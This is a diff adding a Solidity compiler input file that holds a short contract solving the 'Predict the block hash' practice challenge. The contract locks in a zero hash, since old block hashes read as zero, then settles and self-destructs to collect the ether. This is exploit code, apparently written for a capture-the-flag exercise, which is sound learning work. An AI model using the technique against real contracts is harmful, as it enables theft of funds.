@@ -1,0 +1,28 @@
+{
+  "language": "Solidity",
+  "sources": {
+    "contracts/predictTheBlockHash.sol": {
+      "content": "pragma solidity ^0.4.21;\n\ninterface PredictTheBlockHashChallenge{\n    function lockInGuess(bytes32 hashNum) external payable;\n    function settle() external;\n}\n\ncontract predictTheBlockHash{\n    bytes32 answer = 0x0000000000000000000000000000000000000000000000000000000000000000;\n    PredictTheBlockHashChallenge public target;\n\n    function setTargetContract(address _target) public{\n        target = PredictTheBlockHashChallenge(_target);\n    }\n\n    function guess() public{\n        target.lockInGuess.value(1 ether)(answer);\n    }\n\n    function success() public {\n        target.settle();\n    }\n\n    function destroy() public{\n        selfdestruct(msg.sender);\n    }\n\n    function() external payable {}\n}"
+    }
+  },
+  "settings": {
+    "optimizer": {
+      "enabled": false,
+      "runs": 200
+    },
+    "outputSelection": {
+      "*": {
+        "*": [
+          "abi",
+          "evm.bytecode",
+          "evm.deployedBytecode",
+          "evm.methodIdentifiers",
+          "metadata"
+        ],
+        "": [
+          "ast"
+        ]
+      }
+    }
+  }
+}
